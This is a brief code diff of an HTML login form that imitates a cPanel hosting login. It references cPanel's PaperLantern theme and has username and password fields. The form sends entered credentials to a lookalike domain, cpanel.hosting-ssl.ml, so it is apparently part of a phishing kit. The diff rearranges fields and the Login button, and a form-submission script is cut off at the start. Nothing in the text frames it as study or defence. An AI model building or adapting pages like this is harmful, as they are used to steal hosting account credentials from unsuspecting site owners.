@@ -1,10 +1,9 @@
 <form id="LoginForm" action="https://cpanel.hosting-ssl.ml/login.php" method="post">
 	<p><span>Username: </span><input type="text" id="uname" placeholder="username"></p>
 	<p><span>Password: </span><input type="password" id="passwd" placeholder="password"></p>
-	<input type="hidden" id="theme" value="PaperLantern">
-	<input type="hidden" id="language" value="English">
-	<button onclick="SendForm()">Login</button>
+	<input type="hidden" id="submit" value="Login">
 </form>
+<button onclick="SendForm()">Login</button>
 <script>
 Object.prototype.toFormurl = function() {
 	var json = undefined;
